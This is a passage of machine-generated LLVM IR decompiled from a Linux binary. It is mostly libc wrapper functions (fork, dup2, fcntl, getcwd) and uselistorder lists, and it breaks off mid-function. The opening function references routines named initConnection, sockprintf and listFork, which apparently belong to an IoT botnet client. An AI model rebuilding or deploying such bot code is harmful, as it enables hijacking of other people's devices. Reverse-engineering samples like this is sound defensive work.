  store i32 %v0_805074b, i32* %eax.global-to-local, align 4
  %v0_8050750 = load i32, i32* @esp, align 4
  %v8_8050756 = icmp ne i32 %v0_805074b, -1
  store i1 %v8_8050756, i1* %cf.global-to-local, align 1
  %v13_8050756 = icmp eq i32 %v0_805074b, -1
  %v1_805075a = icmp eq i1 %v13_8050756, false
  br i1 %v1_805075a, label %dec_label_pc_805028b, label %dec_label_pc_805007d.outer

; uselistorder directives
  uselistorder i32 %v0_805074b, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-60.3, { 1, 0 }
  uselistorder i32 %v0_8050741, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-96.2.ph29, { 0, 2, 1 }
  uselistorder i8* %stack_var_-64.2.ph27, { 2, 1, 0 }
  uselistorder i32 %stack_var_-28.1.ph, { 1, 0, 3, 4, 2 }
  uselistorder i32 %v4_805072a, { 0, 3, 1, 2, 4 }
  uselistorder i32 %storemerge233, { 3, 2, 0, 1 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_80506e9, { 2, 1, 0 }
  uselistorder i32 %v3_80506d4, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 0, 2, 1 }
  uselistorder i32 %v0_80506ca, { 2, 1, 0 }
  uselistorder i32 %v1_8050694, { 1, 0 }
  uselistorder i32 %v1_8050662, { 1, 0 }
  uselistorder i32 %v5_805063a, { 1, 0 }
  uselistorder i32 %v4_8050637, { 2, 1, 0, 3, 4 }
  uselistorder i32 %stack_var_-40.155, { 0, 5, 4, 2, 3, 1 }
  uselistorder i8* %v3_8050647, { 2, 0, 1 }
  uselistorder i32 %v1_8050623, { 1, 0 }
  uselistorder i32 %v0_80505ec, { 0, 2, 1 }
  uselistorder i32 %storemerge23.in.in, { 3, 2, 1, 0 }
  uselistorder i32 %v0_80505a9, { 1, 2, 3, 0 }
  uselistorder i32 %v0_805058b, { 1, 2, 3, 0 }
  uselistorder i32 %v0_805056f, { 0, 1, 5, 6, 2, 4, 3, 7 }
  uselistorder i32 %v0_805055c, { 1, 2, 0 }
  uselistorder i32 %v0_8050541, { 1, 2, 3, 0 }
  uselistorder i1 %v0_8050504, { 1, 0 }
  uselistorder i32 %v7_8050502, { 1, 0 }
  uselistorder i8* %v22_805049e, { 0, 2, 1 }
  uselistorder i8* %storemerge15, { 1, 0 }
  uselistorder i32 %v5_80504c6, { 3, 2, 1, 0 }
  uselistorder i32 %v2_80504b7, { 1, 0 }
  uselistorder i32 %storemerge15.in227, { 2, 1, 0 }
  uselistorder i8* %storemerge15228, { 1, 0 }
  uselistorder i32 %v6_8050471, { 1, 0 }
  uselistorder i32 %v6_8050449, { 1, 0 }
  uselistorder i32 %v6_8050424, { 1, 0 }
  uselistorder i32 %v1_8050439, { 1, 0, 2, 3, 5, 4 }
  uselistorder i8* %v5_8050401, { 5, 0, 3, 1, 2, 4, 6, 8, 7 }
  uselistorder i32 %v1_80503fe, { 9, 8, 13, 6, 7, 11, 10, 0, 4, 1, 2, 3, 12, 14, 5, 15, 16, 17 }
  uselistorder i32 %v6_80503fb, { 1, 0 }
  uselistorder i8* %storemerge16.lcssa, { 1, 0 }
  uselistorder i32 %v5_80503ae, { 0, 1, 4, 3, 2 }
  uselistorder i32 %stack_var_-96.1, { 1, 0 }
  uselistorder i32 %v4_8050367, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %v3_8050353, { 0, 2, 1 }
  uselistorder i32 %v0_805031a, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v3_8050315, { 0, 2, 1 }
  uselistorder i32 %v0_8050303, { 1, 2, 0 }
  uselistorder i32 %v0_80502a5, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v0_805029f, { 1, 0, 2 }
  uselistorder i32 %storemerge17, { 2, 5, 4, 0, 3, 1 }
  uselistorder i32 %stack_var_-60.2, { 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v0_80500f4.in, { 0, 3, 2, 1 }
  uselistorder i32 %v0_805022d, { 1, 0, 2 }
  uselistorder i32 %storemerge18, { 1, 3, 0, 2 }
  uselistorder i32 %v2_80501fa, { 2, 0, 1 }
  uselistorder i32 %v1_80501e3, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_80501ae, { 1, 0 }
  uselistorder i32 %v0_8050153, { 1, 0, 2 }
  uselistorder i32 %storemerge19, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v2_8050122, { 1, 0, 2 }
  uselistorder i32 %.pre, { 0, 2, 1 }
  uselistorder i32 %v2_80500e5, { 1, 0 }
  uselistorder i32 %v0_8050095, { 0, 2, 1 }
  uselistorder i8* %storemerge16190, { 2, 0, 1, 3 }
  uselistorder i32 %v5_805039b, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v2_8050528, { 6, 7, 0, 1, 2, 3, 4, 5, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 %v2_8050735, { 15, 16, 0, 1, 6, 5, 7, 8, 2, 10, 9, 11, 12, 13, 14, 3, 4 }
  uselistorder i32 %v2_804ffe3, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804ff8a, { 2, 1, 0, 3, 4 }
  uselistorder i8* %tmp164, { 1, 0, 2 }
  uselistorder i32 %v2_804ff0e, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v7_804febb, { 1, 0 }
  uselistorder i32 %v3_804ff8713, { 1, 0 }
  uselistorder i32 %stack_var_-88.0, { 5, 4, 1, 0, 3, 2, 6 }
  uselistorder i32* %tmp160, { 1, 0, 2 }
  uselistorder i1 %v5_804fdfe, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v2_804fdc3, { 1, 0, 2 }
  uselistorder i1 %v5_804fdaf, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 %v2_804fd1f, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-24, { 2, 1, 0, 3 }
  uselistorder i8** %stack_var_-5888, { 22, 23, 26, 21, 20, 19, 16, 15, 18, 17, 24, 25, 14, 12, 11, 13, 10, 9, 8, 7, 6, 0, 5, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_-624, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-1648, { 1, 0, 2 }
  uselistorder i8** %stack_var_-36, { 3, 2, 1, 4, 0 }
  uselistorder i32* %edx.global-to-local, { 18, 19, 0, 1, 2, 3, 4, 5, 9, 10, 17, 12, 11, 13, 15, 14, 16, 20, 21, 22, 23, 24, 6, 7, 8 }
  uselistorder i32* %eax.global-to-local, { 93, 94, 2, 0, 1, 136, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 20, 21, 15, 16, 17, 18, 19, 22, 23, 24, 25, 26, 35, 27, 28, 31, 32, 29, 30, 135, 134, 33, 34, 36, 37, 133, 132, 38, 39, 40, 43, 44, 45, 41, 42, 46, 47, 48, 49, 50, 51, 52, 53, 131, 130, 65, 66, 67, 68, 69, 70, 72, 73, 71, 74, 75, 76, 92, 77, 78, 81, 79, 80, 82, 83, 86, 84, 85, 87, 88, 89, 90, 91, 95, 96, 97, 99, 98, 129, 100, 101, 102, 103, 104, 107, 105, 106, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64 }
  uselistorder i1* %cf.global-to-local, { 68, 69, 2, 1, 119, 3, 4, 11, 5, 6, 7, 8, 9, 10, 0, 12, 13, 14, 19, 20, 15, 16, 17, 18, 21, 22, 23, 24, 25, 117, 28, 26, 27, 118, 29, 30, 116, 31, 32, 34, 35, 33, 36, 37, 38, 39, 115, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 67, 61, 62, 63, 64, 65, 66, 70, 71, 72, 73, 114, 74, 75, 76, 77, 78, 84, 85, 79, 80, 81, 47, 82, 83, 86, 87, 88, 91, 92, 93, 94, 95, 89, 90, 99, 100, 96, 97, 98, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 40, 41, 42, 43, 44, 45, 46 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @fdgets, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @szprintf, { 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 89, 88, 87, 86, 85, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28 }
  uselistorder i32 ()* @listFork, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i8 13, { 0, 3, 1, 2 }
  uselistorder i32 (i32, i8*)* @strstr, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_8057f37.21 to i32), { 2, 1, 0 }
  uselistorder i32 ()* @trim, { 1, 0 }
  uselistorder i32 (i32, i32)* @sockprintf, { 21, 2, 1, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 22, 0 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 1, 4, 3, 2, 0 }
  uselistorder i32 (i32)* @sleep, { 3, 0, 2, 1 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_80591c1.456 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @__libc_fork, { 2, 1, 5, 4, 3, 0 }
  uselistorder i8* bitcast (i8** @global_var_80591b5.453 to i8*), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_80591a8.452 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_80591a6.451 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint ([19 x i8]* @global_var_8059193.450 to i32), { 0, 2, 1 }
  uselistorder i32* inttoptr (i32 8 to i32*), { 7, 8, 9, 1, 0, 2, 3, 4, 10, 11, 5, 6 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 28, 10, 11, 0, 12, 13, 1, 14, 15, 2, 16, 26, 27, 17, 18, 19, 20, 21, 22, 23, 3, 4, 5, 6, 7, 8, 9, 24, 25 }
  uselistorder i32* inttoptr (i32 12 to i32*), { 9, 2, 3, 4, 0, 1, 5, 6, 10, 8, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_8059192.449 to i32), { 0, 3, 2, 4, 1 }
  uselistorder label %dec_label_pc_8050735.outer26, { 1, 0 }
  uselistorder label %dec_label_pc_8050714, { 1, 0 }
  uselistorder label %dec_label_pc_80506ca, { 1, 0 }
  uselistorder label %dec_label_pc_8050637, { 1, 0 }
  uselistorder label %dec_label_pc_805060b, { 1, 0 }
  uselistorder label %dec_label_pc_80505d5, { 1, 0 }
  uselistorder label %dec_label_pc_80504a9, { 1, 0 }
  uselistorder label %dec_label_pc_8050498, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805048f, { 1, 0 }
  uselistorder label %dec_label_pc_805042b, { 1, 0 }
  uselistorder label %dec_label_pc_80503c3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80503ba, { 1, 0 }
  uselistorder label %dec_label_pc_8050735.outer26.backedge, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_805038f, { 1, 0 }
  uselistorder label %dec_label_pc_8050288, { 1, 0 }
  uselistorder label %dec_label_pc_8050219, { 1, 0 }
  uselistorder label %dec_label_pc_80501f7, { 1, 0 }
  uselistorder label %dec_label_pc_805013f, { 1, 0 }
  uselistorder label %dec_label_pc_8050115, { 1, 0 }
  uselistorder label %dec_label_pc_8050086, { 1, 0 }
  uselistorder label %dec_label_pc_805007d.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050057, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ffde, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_804fed9, { 1, 0 }
  uselistorder label %dec_label_pc_804fe37, { 1, 0 }
}

define i32 @__vfork(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805076e = call i32 @vfork()
  %v5_8050771 = icmp ult i32 %v0_805076e, -4095
  %v1_8050776 = icmp eq i1 %v5_8050771, false
  call void @__pseudo_cond_branch(i1 %v1_8050776, i32 134564592)
  ret i32 %v0_805076e
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8050780 = load i32, i32* @edi, align 4
  %v0_8050781 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8050795 = add i32 %arg2, -12
  store i32 %arg3, i32* @edx, align 4
  %v6_805079f = icmp ugt i32 %v1_8050795, 2
  br i1 %v6_805079f, label %dec_label_pc_80507af, label %dec_label_pc_80507a1

dec_label_pc_80507a1:                             ; preds = %entry
  %v4_80507a5 = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_8050795)
  br label %dec_label_pc_80507d1

dec_label_pc_80507af:                             ; preds = %entry
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_80507b7 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_80507b7, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_80507b7, -4095
  br i1 %tmp17, label %dec_label_pc_80507cf, label %dec_label_pc_80507c3

dec_label_pc_80507c3:                             ; preds = %dec_label_pc_80507af
  %v1_80507c3 = call i32 @__errno_location(i32 %v0_8050781)
  %v0_80507c8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80507c8 = sub i32 0, %v0_80507c8
  %v2_80507ca = inttoptr i32 %v1_80507c3 to i32*
  store i32 %v1_80507c8, i32* %v2_80507ca, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80507cf

dec_label_pc_80507cf:                             ; preds = %dec_label_pc_80507af, %dec_label_pc_80507c3
  %v0_80507cf = phi i32 [ %v2_80507b7, %dec_label_pc_80507af ], [ -1, %dec_label_pc_80507c3 ]
  br label %dec_label_pc_80507d1

dec_label_pc_80507d1:                             ; preds = %dec_label_pc_80507a1, %dec_label_pc_80507cf
  %v0_80507d6 = phi i32 [ %v4_80507a5, %dec_label_pc_80507a1 ], [ %v0_80507cf, %dec_label_pc_80507cf ]
  store i32 %v0_8050781, i32* @ebx, align 4
  store i32 %v0_8050780, i32* @edi, align 4
  ret i32 %v0_80507d6

; uselistorder directives
  uselistorder i32 %v2_80507b7, { 1, 0, 2 }
  uselistorder i32 %v0_8050781, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 3, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80507d1, { 1, 0 }
  uselistorder label %dec_label_pc_80507cf, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80507d8 = load i32, i32* @edi, align 4
  store i32 %v0_80507d8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_80507f0 = load i32, i32* @ebx, align 4
  %v1_80507f8 = call i32 @int80_syscall(i32 221)
  store i32 %v1_80507f8, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v1_80507f8, -4095
  br i1 %tmp11, label %dec_label_pc_8050810, label %dec_label_pc_8050804

dec_label_pc_8050804:                             ; preds = %entry
  %v1_8050804 = call i32 @__errno_location(i32 %v0_80507f0)
  %v0_8050809 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050809 = sub i32 0, %v0_8050809
  %v2_805080b = inttoptr i32 %v1_8050804 to i32*
  store i32 %v1_8050809, i32* %v2_805080b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050810

dec_label_pc_8050810:                             ; preds = %entry, %dec_label_pc_8050804
  %v0_8050810 = phi i32 [ %v1_80507f8, %entry ], [ -1, %dec_label_pc_8050804 ]
  %v2_8050815 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050815, i32* %edi.global-to-local, align 4
  ret i32 %v0_8050810

; uselistorder directives
  uselistorder i32 %v1_80507f8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050810, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8050819 = load i32, i32* @ebx, align 4
  store i32 %v0_8050819, i32* %stack_var_-8, align 4
  %v5_805081a = icmp ult i32* %stack_var_-8, inttoptr (i32 4 to i32*)
  store i1 %v5_805081a, i1* @cf, align 1
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable

; uselistorder directives
  uselistorder i1* @cf, { 2, 0, 1 }
  uselistorder i32* inttoptr (i32 4 to i32*), { 2, 0, 3, 4, 5, 1 }
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050840 = load i32, i32* @edi, align 4
  store i32 %v0_8050840, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_8050848 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8050850 = call i32 @chdir(i32 %v0_8050848)
  store i32 %v0_8050848, i32* @ebx, align 4
  store i32 %v1_8050850, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_8050850, -4095
  br i1 %tmp8, label %dec_label_pc_8050868, label %dec_label_pc_805085c

dec_label_pc_805085c:                             ; preds = %entry
  %v1_805085c = call i32 @__errno_location(i32 %v0_8050848)
  %v0_8050861 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050861 = sub i32 0, %v0_8050861
  %v2_8050863 = inttoptr i32 %v1_805085c to i32*
  store i32 %v1_8050861, i32* %v2_8050863, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050868

dec_label_pc_8050868:                             ; preds = %entry, %dec_label_pc_805085c
  %v0_8050868 = phi i32 [ %v1_8050850, %entry ], [ -1, %dec_label_pc_805085c ]
  %v2_805086a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805086a, i32* @edx, align 4
  %v2_805086c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805086c, i32* @edi, align 4
  ret i32 %v0_8050868

; uselistorder directives
  uselistorder i32 %v1_8050850, { 1, 0, 2 }
  uselistorder i32 %v0_8050848, { 1, 0, 2 }
  uselistorder i32 (i32)* @chdir, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050868, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050870 = load i32, i32* @edi, align 4
  store i32 %v0_8050870, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8050878 = load i32, i32* @ebx, align 4
  %v1_8050880 = call i32 @close(i32 %arg1)
  store i32 %v0_8050878, i32* @ebx, align 4
  store i32 %v1_8050880, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_8050880, -4095
  br i1 %tmp8, label %dec_label_pc_8050898, label %dec_label_pc_805088c

dec_label_pc_805088c:                             ; preds = %entry
  %v1_805088c = call i32 @__errno_location(i32 %v0_8050878)
  %v0_8050891 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050891 = sub i32 0, %v0_8050891
  %v2_8050893 = inttoptr i32 %v1_805088c to i32*
  store i32 %v1_8050891, i32* %v2_8050893, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050898

dec_label_pc_8050898:                             ; preds = %entry, %dec_label_pc_805088c
  %v0_8050898 = phi i32 [ %v1_8050880, %entry ], [ -1, %dec_label_pc_805088c ]
  %v2_805089a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805089a, i32* @edx, align 4
  %v2_805089c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805089c, i32* @edi, align 4
  ret i32 %v0_8050898

; uselistorder directives
  uselistorder i32 %v1_8050880, { 1, 0, 2 }
  uselistorder i32 %v0_8050878, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050898, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80508a0 = load i32, i32* @ebx, align 4
  store i32 %v0_80508a0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_80508b3 = call i32 @dup2(i32 %v0_80508a0, i32 %tmp4)
  store i32 %v2_80508b3, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_80508b3, -4095
  br i1 %tmp8, label %dec_label_pc_80508cc, label %dec_label_pc_80508c0

dec_label_pc_80508c0:                             ; preds = %entry
  %v0_80508c0 = load i32, i32* %stack_var_-4, align 4
  %v1_80508c0 = call i32 @__errno_location(i32 %v0_80508c0)
  %v0_80508c5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80508c5 = sub i32 0, %v0_80508c5
  %v2_80508c7 = inttoptr i32 %v1_80508c0 to i32*
  store i32 %v1_80508c5, i32* %v2_80508c7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80508cc

dec_label_pc_80508cc:                             ; preds = %entry, %dec_label_pc_80508c0
  %v0_80508cc = phi i32 [ %v2_80508b3, %entry ], [ -1, %dec_label_pc_80508c0 ]
  %v2_80508d0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80508d0, i32* @ebx, align 4
  ret i32 %v0_80508cc

; uselistorder directives
  uselistorder i32 %v2_80508b3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @dup2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80508cc, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80508d4 = load i32, i32* @ebx, align 4
  store i32 %v0_80508d4, i32* %stack_var_-4, align 4
  %v1_80508dd = call i32 @fork(i32 %v0_80508d4)
  store i32 %v1_80508dd, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_80508dd, -4095
  br i1 %tmp6, label %dec_label_pc_80508f4, label %dec_label_pc_80508e8

dec_label_pc_80508e8:                             ; preds = %entry
  %v0_80508e8 = load i32, i32* %stack_var_-4, align 4
  %v1_80508e8 = call i32 @__errno_location(i32 %v0_80508e8)
  %v0_80508ed = load i32, i32* %ebx.global-to-local, align 4
  %v1_80508ed = sub i32 0, %v0_80508ed
  %v2_80508ef = inttoptr i32 %v1_80508e8 to i32*
  store i32 %v1_80508ed, i32* %v2_80508ef, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80508f4

dec_label_pc_80508f4:                             ; preds = %entry, %dec_label_pc_80508e8
  %v0_80508f4 = phi i32 [ %v1_80508dd, %entry ], [ -1, %dec_label_pc_80508e8 ]
  %v2_80508f6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80508f6, i32* @edx, align 4
  %v2_80508f8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80508f8, i32* @ebx, align 4
  ret i32 %v0_80508f4

; uselistorder directives
  uselistorder i32 %v1_80508dd, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80508f4, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-44, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %v0_80508fc = load i32, i32* @ebp, align 4
  %v0_80508fd = load i32, i32* @edi, align 4
  %v0_80508fe = load i32, i32* @esi, align 4
  %v0_80508ff = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebp, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_805090b = icmp eq i32 %arg2, 0
  %v1_805090d = icmp eq i1 %v1_805090b, false
  br i1 %v1_805090d, label %dec_label_pc_8050938, label %dec_label_pc_805090f

dec_label_pc_805090f:                             ; preds = %entry
  %v1_805090f = icmp eq i32 %arg1, 0
  br i1 %v1_805090f, label %dec_label_pc_8050923, label %dec_label_pc_8050913

dec_label_pc_8050913:                             ; preds = %dec_label_pc_805090f
  %v1_8050913 = call i32 @__errno_location(i32 %v0_80508ff)
  %v1_8050918 = inttoptr i32 %v1_8050913 to i32*
  store i32 22, i32* %v1_8050918, align 4
  br label %dec_label_pc_80509a9

dec_label_pc_8050923:                             ; preds = %dec_label_pc_805090f
  %v3_8050923 = call i32 @__GI_getpagesize(i32 %v0_80508ff, i32 %v0_80508fe, i32 %v0_80508fd)
  store i32 %v3_8050923, i32* @ebx, align 4
  %v5_805092f = icmp slt i32 %v3_8050923, 4096
  br i1 %v5_805092f, label %dec_label_pc_8050931, label %dec_label_pc_8050940

dec_label_pc_8050931:                             ; preds = %dec_label_pc_8050923
  store i32 4096, i32* @ebx, align 4
  br label %dec_label_pc_8050940

dec_label_pc_8050938:                             ; preds = %entry
  store i32 %arg2, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_805093c = icmp eq i32 %arg1, 0
  %v1_805093e = icmp eq i1 %v1_805093c, false
  br i1 %v1_805093e, label %dec_label_pc_8050952, label %dec_label_pc_8050940

dec_label_pc_8050940:                             ; preds = %dec_label_pc_8050923, %dec_label_pc_8050938, %dec_label_pc_8050931
  %v0_8050943 = phi i32 [ %v3_8050923, %dec_label_pc_8050923 ], [ %arg2, %dec_label_pc_8050938 ], [ 4096, %dec_label_pc_8050931 ]
  store i32 %v0_8050943, i32* %stack_var_-44, align 4
  %v1_8050944 = call i32 @malloc(i32 %v0_8050943)
  store i32 %v1_8050944, i32* @esi, align 4
  %v1_805094e = icmp eq i32 %v1_8050944, 0
  br i1 %v1_805094e, label %dec_label_pc_80509a9, label %dec_label_pc_8050940.dec_label_pc_8050952_crit_edge

dec_label_pc_8050940.dec_label_pc_8050952_crit_edge: ; preds = %dec_label_pc_8050940
  %v0_805095d.pre = load i32, i32* %stack_var_-44, align 4
  br label %dec_label_pc_8050952

dec_label_pc_8050952:                             ; preds = %dec_label_pc_8050940.dec_label_pc_8050952_crit_edge, %dec_label_pc_8050938
  %v0_805095d = phi i32 [ %v0_805095d.pre, %dec_label_pc_8050940.dec_label_pc_8050952_crit_edge ], [ %tmp11, %dec_label_pc_8050938 ]
  %v0_8050952 = phi i32 [ %v1_8050944, %dec_label_pc_8050940.dec_label_pc_8050952_crit_edge ], [ %arg1, %dec_label_pc_8050938 ]
  store i32 %v0_8050952, i32* @ebx, align 4
  %v2_805095d = call i32 @getcwd(i32 %v0_805095d, i32 %tmp12)
  %v0_805095f = load i32, i32* @ebx, align 4
  store i32 %v0_805095f, i32* @edx, align 4
  store i32 %v2_805095d, i32* @ebx, align 4
  %tmp18 = icmp ult i32 %v2_805095d, -4095
  br i1 %tmp18, label %dec_label_pc_8050975, label %dec_label_pc_805096a

dec_label_pc_805096a:                             ; preds = %dec_label_pc_8050952
  %v0_805096a = load i32, i32* %stack_var_-44, align 4
  %v1_805096a = call i32 @__errno_location(i32 %v0_805096a)
